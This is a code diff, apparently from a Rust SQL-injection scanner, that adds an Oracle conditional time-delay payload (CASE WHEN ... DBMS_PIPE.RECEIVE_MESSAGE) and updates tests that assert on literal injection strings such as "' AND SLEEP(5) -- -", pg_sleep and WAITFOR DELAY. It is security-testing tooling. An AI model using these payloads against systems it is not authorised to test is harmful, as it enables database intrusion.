@@ -53,6 +53,7 @@ pub fn time_payload_for(dbms: Option<&str>, secs: u64) -> TimePayload {
 ///   `IF(1=1) WAITFOR` conditional, `sysobjects` cartesian heavy (no
 ///   `WAITFOR` keyword).
 /// - Oracle: `DBMS_PIPE.RECEIVE_MESSAGE` (legacy), `DBMS_LOCK.SLEEP` alternate,
+///   `CASE WHEN ... THEN DBMS_PIPE` conditional (`PortSwigger`),
 ///   `all_objects` cartesian heavy (no `sleep` keyword).
 /// - SQLite: heavy-query `RANDOMBLOB` CPU burn (legacy), conditional
 ///   `CASE WHEN` heavy variant. No `SLEEP()` on SQLite — blob size scales
@@ -111,6 +112,11 @@ pub fn time_payloads_for(dbms: Option<&str>, secs: u64) -> Vec<TimePayload> {
                 tag.clone(),
             ),
             TimePayload::new(
+                crate::dbms::oracle::payloads::oracle_time_conditional(secs),
+                secs,
+                tag.clone(),
+            ),
+            TimePayload::new(
                 crate::dbms::oracle::payloads::oracle_time_heavy(),
                 secs,
                 tag.clone(),
@@ -131,7 +137,7 @@ pub fn time_payloads_for(dbms: Option<&str>, secs: u64) -> Vec<TimePayload> {
 /// when the backend is unknown. Ordering is stable: all five legacy
 /// payloads first (mysql, postgres, mssql, oracle, sqlite), then conditional/
 /// alternate/heavy variants — so `--level` budgets degrade gracefully to legacy
-/// coverage (L1 = first 4 legacies, L2 = first 8, L3+ = all 16).
+/// coverage (L1 = first 4 legacies, L2 = first 8, L3+ = all 17).
 ///
 /// # Panics
 /// Panics if `secs < 1`.
@@ -267,18 +273,25 @@ mod tests {
     #[test]
     fn oracle_has_lock_variant() {
         let v = time_payloads_for(Some("oracle"), 5);
-        assert_eq!(v.len(), 3);
+        assert_eq!(v.len(), 4);
         assert!(
             v[1].payload.contains("DBMS_LOCK.SLEEP(5)"),
             "{}",
             v[1].payload
         );
-        // P0-5 heavy: dictionary cartesian burn, no sleep-family keyword.
-        assert!(v[2].payload.contains("all_objects"), "{}", v[2].payload);
+        // `PortSwigger` conditional: CASE WHEN ... THEN DBMS_PIPE.
+        assert!(v[2].payload.contains("CASE WHEN (1=1)"), "{}", v[2].payload);
         assert!(
-            !v[2].payload.to_ascii_lowercase().contains("sleep"),
+            v[2].payload.contains("DBMS_PIPE.RECEIVE_MESSAGE('a',5)"),
             "{}",
             v[2].payload
+        );
+        // P0-5 heavy: dictionary cartesian burn, no sleep-family keyword.
+        assert!(v[3].payload.contains("all_objects"), "{}", v[3].payload);
+        assert!(
+            !v[3].payload.to_ascii_lowercase().contains("sleep"),
+            "{}",
+            v[3].payload
         );
     }
 
@@ -300,7 +313,7 @@ mod tests {
     #[test]
     fn all_payloads_start_with_legacies() {
         let all = all_time_payloads(5);
-        assert_eq!(all.len(), 16);
+        assert_eq!(all.len(), 17);
         assert_eq!(all[0].payload, "' AND SLEEP(5) -- -");
         assert!(all[1].payload.contains("pg_sleep(5)"));
         assert!(all[2].payload.contains("WAITFOR DELAY"));
